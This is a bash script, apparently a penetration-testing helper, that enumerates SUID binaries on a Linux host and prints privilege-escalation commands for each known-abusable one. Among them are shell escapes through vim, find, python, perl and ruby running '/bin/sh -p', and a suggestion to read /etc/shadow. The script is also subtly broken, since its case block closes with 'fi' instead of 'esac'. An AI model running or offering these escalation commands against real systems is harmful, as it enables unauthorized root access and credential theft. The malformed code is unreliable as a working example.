#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         SUID EXPLOITATION HELPER        ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

echo -e "\n${BLUE}[+] Finding SUID binaries...${NC}"
find / -perm -u=s -type f 2>/dev/null > /tmp/suid_list.txt
suid_count=$(wc -l < /tmp/suid_list.txt)
echo -e "${GREEN}Found $suid_count SUID binaries${NC}"

echo -e "\n${BLUE}[+] Checking for known exploitable SUID binaries${NC}"

exploitable_bins=(
    "nmap"
    "vim"
    "nano"
    "less"
    "more"
    "cp"
    "mv"
    "find"
    "cat"
    "head"
    "tail"
    "sh"
    "bash"
    "dash"
    "python"
    "python2"
    "python3"
    "perl"
    "ruby"
    "nc"
    "netcat"
    "wget"
    "curl"
    "ftp"
    "gdb"
    "sed"
    "awk"
    "tar"
    "zip"
    "unzip"
    "strace"
    "socat"
    "base64"
    "xxd"
)

for bin in "${exploitable_bins[@]}"; do
    if grep -q "/$bin$" /tmp/suid_list.txt; then
        echo -e "${RED}[!] POTENTIALLY EXPLOITABLE: $bin${NC}"
        echo -e "${YELLOW}    Check GTFOBins: https://gtfobins.github.io/gtfobins/$bin${NC}"
        
        case $bin in
            nmap)
                echo -e "${GREEN}    Exploit: nmap --interactive${NC}"
                echo -e "${GREEN}    Then: !sh${NC}"
                ;;
            vim)
                echo -e "${GREEN}    Exploit: vim -c ':!sh'${NC}"
                echo -e "${GREEN}    Or: vim -> :shell${NC}"
                ;;
            nano)
                echo -e "${GREEN}    Exploit: nano -> ^R ^X reset; sh 1>&0 2>&0${NC}"
                ;;
            less|more)
                echo -e "${GREEN}    Exploit: !sh${NC}"
                ;;
            find)
                echo -e "${GREEN}    Exploit: find . -exec /bin/sh -p \; -quit${NC}"
                ;;
            cat)
                echo -e "${GREEN}    Exploit: cat /etc/shadow (if readable)${NC}"
                ;;
            bash|sh|dash)
                echo -e "${GREEN}    Exploit: ./bash -p${NC}"
                ;;
            python|python2|python3)
                echo -e "${GREEN}    Exploit: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${NC}"
                ;;
            perl)
                echo -e "${GREEN}    Exploit: perl -e 'exec \"/bin/sh -p\"'${NC}"
                ;;
            ruby)
                echo -e "${GREEN}    Exploit: ruby -e 'exec \"/bin/sh -p\"'${NC}"
                ;;
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking for custom SUID binaries${NC}"
while IFS= read -r file; do
    bin_name=$(basename "$file")
    if [[ ! " ${exploitable_bins[@]} " =~ " ${bin_name} " ]]; then
        echo -e "${YELLOW}    Custom SUID: $file${NC}"
        echo -e "${YELLOW}    Analyze with: strings $file${NC}"
    fi
done < /tmp/suid_list.txt

echo -e "\n${BLUE}[+] Binary details for top 5 SUID files${NC}"
head -5 /tmp/suid_list.txt | while IFS= read -r file; do
    echo -e "${GREEN}$file${NC}"
    ls -la "$file"
    file "$file"
    strings "$file" | grep -i "sh\|bash\|root\|password" | head -5
    echo "---"
done

echo -e "\n${BLUE}[+] Environment check${NC}"
echo "LD_PRELOAD: ${LD_PRELOAD:-not set}"
echo "LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-not set}"

echo -e "\n${GREEN}[+] SUID enumeration complete${NC}"
echo -e "${YELLOW}Full list saved to: /tmp/suid_list.txt${NC}"
